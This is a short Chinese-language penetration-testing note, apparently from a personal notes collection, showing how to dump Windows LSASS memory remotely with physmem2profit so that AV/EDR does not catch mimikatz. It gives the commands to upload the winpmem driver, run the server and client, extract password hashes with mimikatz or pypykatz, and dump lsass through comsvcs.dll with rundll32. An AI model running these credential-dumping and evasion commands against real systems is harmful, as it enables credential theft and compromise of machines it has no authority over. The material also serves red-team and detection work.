	https://github.com/FSecureLABS/physmem2profit
	mimikatz被多数安全人员用来获取凭据，但现在的AV/EDR很轻易的识别并查杀，这里不在服务器端使用mimikatz，远程对lsass进程进行转储。
	服务器端直接使用visual studio构建
	physmem2profit-public\server\
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/691.png)

	客户端
	>git clone --recurse-submodules https://github.com/FSecureLABS/physmem2profit.git
	客户端这里先安装
	>bash physmem2profit/client/install.sh
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/692.png)

	需要将此文件
	https://github.com/Velocidex/c-aff4/raw/master/tools/pmem/resources/winpmem/att_winpmem_64.sys
	传到目标服务器，我这里存放在c:\windows\temp\中
	服务器端执行
	>Physmem2profit.exe --ip 192.168.0.98 --port 8888 –verbose这里的IP是服务器端IP
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/693.png)

	攻击端安装所需模块
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/694.png)

	攻击端执行
	>source physmem2profit/client/.env/bin/activate
	>cd physmem2profit/client
	>python3 physmem2profit --mode all --host 192.168.0.98 --port 8888 --drive winpmem --install 'c:\windows\temp\att_winpmem_64.sys' --label test
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/695.png)

	服务器端可以看到
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/696.png)

	把生成的dmp文件转移到win系统上使用mimikatz即可获得hash，当然也可以在linux上使用pypykatz。
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/697.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/698.png)

	再来一条转储lsass进程的命令
	要以system权限执行
	>rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/699.png)